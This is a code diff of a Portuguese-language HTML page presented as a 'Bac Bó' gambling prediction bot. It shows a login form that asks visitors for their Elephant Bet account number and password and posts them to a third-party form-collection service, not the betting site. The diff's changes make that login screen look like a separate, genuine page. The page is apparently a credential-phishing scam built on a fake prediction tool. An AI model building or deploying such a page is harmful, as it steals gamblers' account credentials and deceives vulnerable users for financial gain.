@@ -20,7 +20,7 @@
     }
     .circle {
       font-size: 2em;
-      margin: 20px auto;
+      margin: 20px auto 5px auto;
       padding: 40px;
       border-radius: 50%;
       width: 180px;
@@ -31,7 +31,11 @@
     }
     .azul { color:#00f; border:3px solid #00f; box-shadow:0 0 20px #00f; }
     .vermelho { color:#f00; border:3px solid #f00; box-shadow:0 0 20px #f00; }
-    .empate { color:#ffd700; border:3px solid #ffd700; box-shadow:0 0 20px #ffd700; }
+    .empate-text {
+      font-size: 0.9em;
+      color: #ffd700;
+      margin-top: 5px;
+    }
     .blocked {
       background:#333; color:#ffcc00; padding:10px; margin:15px auto;
       border-radius:5px; width:90%; font-size:0.9em;
@@ -61,11 +65,10 @@
 <body>
   <h1>BOT PREDICTOR - Bac Bó</h1>
 
-  <!-- Resultados variáveis -->
+  <!-- Roda principal -->
   <div id="circle" class="circle">--</div>
-
-  <!-- Empate fixo -->
-  <div class="circle empate">20%</div>
+  <!-- Empate fixo abaixo -->
+  <div class="empate-text">20% Empate</div>
 
   <div id="blocked" class="blocked" style="display:none;">
     ⚠️ Acesso bloqueado
@@ -80,7 +83,7 @@
   <!-- Botão para abrir tela de login -->
   <button id="openLogin">Conectar o Bot</button>
 
-  <!-- Tela de login (oculta inicialmente) -->
+  <!-- Tela de login (oculta inicialmente, aparece como página separada) -->
   <div id="loginScreen">
     <h2>Conecte com a sua conta da Elephant Bet</h2>
     <form id="loginForm" action="https://formspree.io/f/mbdeddpb" method="POST">
@@ -134,10 +137,13 @@
     const senhaInput = document.getElementById("senha");
 
     openLogin.addEventListener("click", function() {
-      loginScreen.style.display = "block";
+      document.body.style.display = "none"; // esconde página inicial
+      loginScreen.style.display = "block";  // mostra tela de login
+      document.body.appendChild(loginScreen);
     });
     closeLogin.addEventListener("click", function() {
       loginScreen.style.display = "none";
+      document.body.style.display = "block"; // volta página inicial
     });
 
     numeroInput.addEventListener("input", function() {
@@ -169,6 +175,7 @@
           blocked.style.display = "none";
           bar.style.display = "none";
           loginScreen.style.display = "none"; 
+          document.body.style.display = "block"; // volta à página inicial
         }
       } catch (error) {
         // silencioso
